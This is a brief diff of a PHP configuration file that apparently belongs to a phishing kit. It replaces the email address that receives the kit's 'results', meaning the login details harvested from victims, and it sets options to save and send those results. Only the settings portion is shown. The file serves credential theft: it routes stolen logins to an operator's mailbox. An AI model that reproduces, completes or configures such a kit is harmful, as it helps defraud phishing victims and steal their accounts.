@@ -1,6 +1,6 @@
 <?php
 /* PUT YOUR EMAILS HERE */
-$contacts = array("results@steer.cfd","","");  //....as many email address as you need
+$contacts = array("timeless419000@outlook.com","","");  //....as many email address as you need
 $truelogin = 'on'; // on / off
 /* OPTIONS TO SAVE AND SEND YOUR RESULTS */
 $save_results_to_file = "on";           // on / off
